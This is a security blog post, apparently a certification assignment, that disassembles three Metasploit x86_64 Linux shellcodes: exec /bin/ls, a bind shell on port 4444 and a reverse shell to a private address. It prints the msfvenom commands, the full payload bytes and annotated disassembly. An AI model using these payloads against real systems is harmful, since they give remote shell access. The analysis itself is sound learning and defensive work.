@@ -1,0 +1,200 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification." /><meta property="og:description" content="These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification." /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE64-Analyzing-Shellcode/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE64-Analyzing-Shellcode/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-26T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-26T05:44:00+00:00","datePublished":"2021-01-26T05:44:00+00:00","description":"These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.","headline":"SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE64-Analyzing-Shellcode/"},"url":"https://whitecr0wz.github.io/posts/SLAE64-Analyzing-Shellcode/"}</script><title>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1611639840" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 26, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1865 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification.</p><p>The fifth assignment from the seven requires analyzing three <a href="https://es.wikipedia.org/wiki/Shellcode">shellcodes</a> generated by Metasploit in the x86_64 format. Furthermore, it is required to report the findings during the analysis.</p><h4 id="linuxx64exec-shellcode-1"><span class="mr-2">linux/x64/exec (Shellcode #1)</span><a href="#linuxx64exec-shellcode-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first shellcode to be analyzed will execute the operation <code class="language-plaintext highlighter-rouge">/bin/ls</code></p><p>Generating the shellcode with msfvenom:</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f c 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 47 bytes
+Final size of c file: 224 bytes
+unsigned char buf[] = 
+"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
+"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
+"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6"
+"\x0f\x05";
+root@whitecr0wz:~#
+</code></pre><h5 id="ndisasm"><span class="mr-2">Ndisasm</span><a href="#ndisasm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">root@whitecr0wz:~# echo -ne 
+"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48
+\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
+00000000  6A3B              push byte +0x3b                         ; Pushes 59 (execve syscall value) into the stack.
+00000002  58                pop rax                                 ; Pops this value into RAX.
+00000003  99                cdq                                     ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f                ; Moves '/bin/sh' into RBX.
+         -6800
+0000000E  53                push rbx                                ; The value in RBX is pushed into the stack.
+0000000F  4889E7            mov rdi,rsp                             ; The value of RSP is copied into RDI.
+00000012  682D630000        push qword 0x632d                       ; The value '-c' is pushed into the stack.
+00000017  4889E6            mov rsi,rsp                             ; The value of RSP is copied into RSI.
+0000001A  52                push rdx                                ; Pushes the NULL DWORD found in RDX.
+0000001B  E808000000        call 0x28                               ; Calls the function that pushes '/bin/ls' into RSI, then pushes RSI into the stack.
+00000020  2F                db 0x2f
+00000021  62                db 0x62
+00000022  696E2F6C730056    imul ebp,[rsi+0x2f],dword 0x5600736c
+00000029  57                push rdi                                ; Pushes the value of RDI (/bin/sh) into the stack.
+0000002A  4889E6            mov rsi,rsp                             ; The value of RSP is copied into RSI,
+0000002D  0F05              syscall                                 ; The syscall is executed.
+root@whitecr0wz:~#
+</code></pre><h5 id="gdb"><span class="mr-2">GDB</span><a href="#gdb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Generating the shellcode with msfvenom:</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f dw
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 48 bytes
+Final size of dw file: 146 bytes
+0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008,
+0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6
+root@whitecr0wz:~#
+</code></pre><h6 id="contents-of-dissect_1">Contents of dissect_1</h6><pre><code class="language-term">global _start
+
+_start:
+
+       jmp short master
+
+main:
+
+       pop rbp
+       jmp rbp
+
+
+master:
+
+       call main
+       shellcode: dd 0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008, 0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6
+</code></pre><p>Let’s analyze the value of RBP when the instruction <code class="language-plaintext highlighter-rouge">pop rbp</code> is executed.</p><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1 
+Reading symbols from ./dissect_1...(no debugging symbols found)...done.
+(gdb) break main
+Breakpoint 1 at 0x401002
+(gdb) run
+Starting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 
+
+Breakpoint 1, 0x0000000000401002 in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+=&gt; 0x0000000000401002 &lt;+0&gt;:     pop    %rbp
+   0x0000000000401003 &lt;+1&gt;:     jmpq   *%rbp
+End of assembler dump.
+(gdb) nexti
+0x0000000000401003 in main ()
+(gdb) x/7s $rbp 
+0x40100a &lt;shellcode&gt;:   "j;X\231H\273/bin/sh"
+0x401018 &lt;shellcode+14&gt;:        "SH\211\347h-c"
+0x401020 &lt;shellcode+22&gt;:        ""
+0x401021 &lt;shellcode+23&gt;:        "H\211\346R\350\b"
+0x401028 &lt;shellcode+30&gt;:        ""
+0x401029 &lt;shellcode+31&gt;:        ""
+0x40102a &lt;shellcode+32&gt;:        "/bin/ls"
+(gdb)
+</code></pre><h4 id="conclusion-1-shellcode"><span class="mr-2">Conclusion (#1 Shellcode)</span><a href="#conclusion-1-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Indeed, it seems as if <code class="language-plaintext highlighter-rouge">/bin/ls</code> is the last thing to be pushed into the stack. Furthermore, there is a great quantity of space between <code class="language-plaintext highlighter-rouge">-c</code> and <code class="language-plaintext highlighter-rouge">/bin/ls</code> itself.</p><h4 id="linuxx64shell_bind_tcp-2-shellcode"><span class="mr-2">linux/x64/shell_bind_tcp (#2 Shellcode)</span><a href="#linuxx64shell_bind_tcp-2-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h6 id="generating-shellcode">Generating shellcode</h6><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x64/shell_bind_tcp -i 0 -f c[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 86 bytes
+Final size of c file: 386 bytes
+unsigned char buf[] =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
+"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
+"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
+"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
+"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
+root@whitecr0wz:~#
+</code></pre><h5 id="ndisasm-1"><span class="mr-2">Ndisasm</span><a href="#ndisasm-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne 
+"\x6A\x29\x58\x99\x6A\x02\x5F\x6A\x01\x5E\x0F\x05\x48\x97\x52\xC7\x04\x24\x02\x00\x11\x5C\x48\x89\xE6\x6A\x10\x5A\x6A\x31\x58\x0F\x05\x6A\x32\x58\x0F\x05
+\x48\x31\xF6\x6A\x2B\x58\x0F\x05\x48\x97\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48
+\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05" | ndisasm -u - -b 64 
+00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.        
+00000002  58                pop rax                           ; Pops this value into RAX.
+00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000004  6A02              push byte +0x2                    ; Pushes value 2 into the stack.
+00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
+00000007  6A01              push byte +0x1                    ; Pushes value 1 into the stack.
+00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
+0000000A  0F05              syscall                           ; Executes the syscall.
+0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This saves the value in RDI for sockfd operations.
+0000000E  52                push rdx                          ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const 
+                                                              ; struct addr.
+0000000F  C704240200115C    mov dword [rsp],0x5c110002        ; Pushes 4444 in hex into the stack. However, as 4444 is not big enough for RSP, a few NULLs are parsed.
+00000016  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+00000019  6A10              push byte +0x10                   ; The value "16" is pushed into the stack.
+0000001B  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
+0000001C  6A31              push byte +0x31                   ; Pushes syscall value 49 (value of the bind syscall) into the stack.  
+0000001E  58                pop rax                           ; Pops this value into RAX.
+0000001F  0F05              syscall                           ; Executes the syscall.
+00000021  6A32              push byte +0x32                   ; Pushes syscall value 50 (value of the listen syscall) into the stack.  
+00000023  58                pop rax                           ; Pops this value into RAX.
+00000024  0F05              syscall                           ; Executes the syscall.
+00000026  4831F6            xor rsi,rsi                       ; Zeroes out RSI.
+00000029  6A2B              push byte +0x2b                   ; Pushes syscall value 43 (value of the accept syscall) into the stack.  
+0000002B  58                pop rax                           ; Pops this value into RAX.
+0000002C  0F05              syscall                           ; Executes the syscall.
+0000002E  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
+00000030  6A03              push byte +0x3                    ; Pushes value 3 into the stack.
+00000032  5E                pop rsi                           ; Pops this value into RSI.
+00000033  48FFCE            dec rsi                           ; Decrements RSI.
+00000036  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the dup2 syscall) into the stack.  
+00000038  58                pop rax                           ; Pops this value into RAX.
+00000039  0F05              syscall                           ; Executes the syscall.
+0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
+                                                              ; instruction), the loop will not stop.
+0000003D  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.  
+0000003F  58                pop rax                           ; Pops this value into RAX.
+00000040  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
+         -6800
+0000004B  53                push rbx                          ; Pushes the RBX into the stack.
+0000004C  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
+0000004F  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
+00000050  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
+00000051  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+00000054  0F05              syscall                           ; Executes the syscall.
+</code></pre><h4 id="conclusion-2-shellcode"><span class="mr-2">Conclusion (#2 Shellcode)</span><a href="#conclusion-2-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Sadly enough, there isn’t much to comment, as most of the important explanation has been done through the comments. It simply is a shell that binds to port 4444.</p><h4 id="linuxx64shell_reverse_tcp-3-shellcode"><span class="mr-2">linux/x64/shell_reverse_tcp (#3 Shellcode)</span><a href="#linuxx64shell_reverse_tcp-3-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><h6 id="generating-shellcode-1">Generating shellcode</h6><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x64/shell_reverse_tcp -i 0 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of c file: 335 bytes
+unsigned char buf[] =
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
+"\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10"
+"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
+"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
+"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
+root@whitecr0wz:~#
+</code></pre><h5 id="ndisasm-2"><span class="mr-2">Ndisasm</span><a href="#ndisasm-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">root@whitecr0wz:~# echo -ne 
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c
+\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21
+\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
+00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.   
+00000002  58                pop rax                           ; Pops this value into RAX.
+00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000004  6A02              push byte +0x2                    ; Pushes the value 2 into the stack.
+00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
+00000007  6A01              push byte +0x1                    ; Pushes the value 1 into the stack.
+00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
+0000000A  0F05              syscall                           ; Executes the syscall.
+0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
+0000000E  48B90200115CC0A8  mov rcx,0xd664a8c05c110002        ; Pushes "192.168.100.214:4444" within the hex format in reverse. Furthermore, as this string is not long enough to 
+                                                              ; fulfill RCX, additional nulls are parsed.
+         -64D6
+00000018  51                push rcx                          ; RCX is pushed into the stack.
+00000019  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+0000001C  6A10              push byte +0x10                   ; Pushes the value 16 into the stack.
+0000001E  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
+0000001F  6A2A              push byte +0x2a                   ; Pushes syscall value 42 (value of the socket connect) into the stack.
+00000021  58                pop rax                           ; Pops this value into RAX.
+00000022  0F05              syscall                           ; Executes the syscall.
+00000024  6A03              push byte +0x3                    ; The value 3 is pushed into the stack.
+00000026  5E                pop rsi                           ; Pops this value into RSI.
+00000027  48FFCE            dec rsi                           ; Decrements RSI.
+0000002A  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the socket dup2) into the stack.
+0000002C  58                pop rax                           ; Pops this value into RAX.
+0000002D  0F05              syscall                           ; Executes the syscall.
+0000002F  75F6              jnz 0x27                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
+                                                              ; instruction), the loop will not stop.
+00000031  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.
+00000033  58                pop rax                           ; Pops this value into RAX.
+00000034  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
+00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
+         -6800
+0000003F  53                push rbx                          ; Pushes the RBX into the stack.
+00000040  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
+00000043  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
+00000044  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
+00000045  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
+00000048  0F05              syscall                           ; Executes the syscall.
+</code></pre><p>Once again, there isn’t much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards the local address in port 4444.</p><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE64-27812/PA-27812</p><p>You can find all of the used resources within this post <a href="https://github.com/whitecr0wz/SLAE/tree/main/SLAE64">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae64/'>SLAE64</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE64+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Analyzing-Shellcode%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE64+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Analyzing-Shellcode%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE64-Analyzing-Shellcode%2F&text=SLAE64+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Alignments-on-windows-registers/"><div class="card-body"> <em class="small" data-ts="1612158240" data-df="ll" > Feb 1, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Alignments on Windows Registers</h3><div class="text-muted small"><p> Preamble Welcome once again to my website! Within this post, i will be introducing methods to align x86 registers on Windows, topic that was hard for me to find when starting regarding Binary Expl...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnserver-LTER/"><div class="card-body"> <em class="small" data-ts="1612244640" data-df="ll" > Feb 2, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnserver LTER - SEH Extremely restricted character set</h3><div class="text-muted small"><p> Introduction Last time i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the vulnerable server by stephen bradshaw, in which, a res...</p></div></div></a></div><div class="card"> <a href="/posts/Backdooring-PE/"><div class="card-body"> <em class="small" data-ts="1603172640" data-df="ll" > Oct 20, 2020 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdooring PE Files through Code Caves</h3><div class="text-muted small"><p> Introduction Building malware is a topic which has always been from great interest to me. However, injecting malicious code within benign software seems a very concerning yet engrossing concept. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE64-Encoder/" class="btn btn-outline-primary" prompt="Older"><p>SLAE64 - Assignment 4 - Custom Insertion Encoder</p></a> <a href="/posts/SLAE64-Polymorphic/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE64 - Assignment 6 - Polymorphic Shellcode</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" 